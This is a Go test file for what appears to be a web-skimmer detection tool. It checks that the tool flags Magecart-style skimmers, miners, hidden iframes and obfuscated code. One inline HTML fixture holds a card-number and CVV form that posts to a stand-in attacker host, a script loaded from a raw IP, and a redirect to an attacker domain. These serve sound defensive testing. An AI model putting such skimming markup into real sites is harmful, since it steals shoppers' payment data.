package static

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/aviollaz/skimwatch/internal/domains"
	"github.com/aviollaz/skimwatch/internal/model"
)

const store = "https://www.store.example.com.ar/producto/1"

func scope() *domains.Scope { return domains.NewScope([]string{store}, nil) }

func read(t *testing.T, name string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("..", "..", "testdata", name))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func rules(fs []model.Finding) map[string]model.Severity {
	m := map[string]model.Severity{}
	for _, f := range fs {
		if f.Severity > m[f.Rule] || m[f.Rule] == 0 {
			m[f.Rule] = f.Severity
		}
	}
	return m
}

func analyzeFile(t *testing.T, name string) map[string]model.Severity {
	return rules(AnalyzeJS(read(t, name), Context{Target: "t", PageURL: store, Location: "script", Scope: scope()}))
}

func TestDetectsAttacks(t *testing.T) {
	cases := []struct {
		file string
		rule string
		sev  model.Severity
	}{
		{"payloads/checkout_hook.js", "skimmer-pattern", model.Critical},
		{"payloads/magecart.js", "skimmer-pattern", model.Critical},
		{"payloads/miner.js", "cryptominer", model.Critical},
		{"payloads/cloaked_redirect.js", "cloaked-redirect", model.High},
	}
	for _, c := range cases {
		t.Run(c.file, func(t *testing.T) {
			got := analyzeFile(t, c.file)
			if sev, ok := got[c.rule]; !ok || sev != c.sev {
				t.Fatalf("want %s at %s, got %v", c.rule, c.sev, got)
			}
		})
	}
}

func TestCleanCodeStaysQuiet(t *testing.T) {
	for rule, sev := range analyzeFile(t, "payloads/clean_store.js") {
		if sev >= model.Medium {
			t.Errorf("clean code raised %s (%s)", rule, sev)
		}
	}
}

// The Vea case: a skimmer smuggled into a product description as an <img onerror>.
func TestEventHandlerPayload(t *testing.T) {
	doc, err := ParseHTML([]byte(read(t, "vea_like_product.html")), store)
	if err != nil {
		t.Fatal(err)
	}
	if len(doc.Handlers) != 1 {
		t.Fatalf("want 1 handler, got %d", len(doc.Handlers))
	}
	got := rules(AnalyzePage(doc, "t", store, scope()))
	if got["eval-decoded"] != model.Critical {
		t.Errorf("handler eval(atob()) should be critical, got %v", got)
	}
	if got["hidden-payload"] == 0 {
		t.Errorf("base64 payload should be decoded, got %v", got)
	}
	if got["skimmer-pattern"] != model.Critical {
		t.Errorf("decoded payload should be recognized as a skimmer, got %v", got)
	}
}

func TestHTMLChecks(t *testing.T) {
	page := `<html><head><meta http-equiv="refresh" content="0; url=https://evil.attacker.invalid/"></head><body>
<iframe src="https://ads.attacker.invalid/x" width="0" height="0"></iframe>
<form action="https://pay.attacker.invalid/collect" method="post"><input name="cardnumber"><input name="cvv"></form>
<script src="http://45.12.33.9/a.js"></script>
<script type="application/ld+json">{"@context":"https://schema.org"}</script>
<a href="javascript:void(0)">x</a>
</body></html>`
	doc, err := ParseHTML([]byte(page), store)
	if err != nil {
		t.Fatal(err)
	}
	if len(doc.InlineJS) != 0 {
		t.Errorf("JSON-LD must not be treated as script, got %d inline scripts", len(doc.InlineJS))
	}
	got := rules(AnalyzePage(doc, "t", store, scope()))
	for _, r := range []string{"meta-refresh-external", "hidden-iframe", "card-form-external", "script-from-ip"} {
		if got[r] < model.High {
			t.Errorf("want %s at high or above, got %v", r, got)
		}
	}
}

func TestRevealHidden(t *testing.T) {
	code := `var a = String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101);
var b = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d";`
	h := RevealHidden(code)
	if len(h) != 2 || h[0].Text != "document.write" || h[1].Text != "https://evil.com" {
		t.Fatalf("unexpected decode: %+v", h)
	}
}
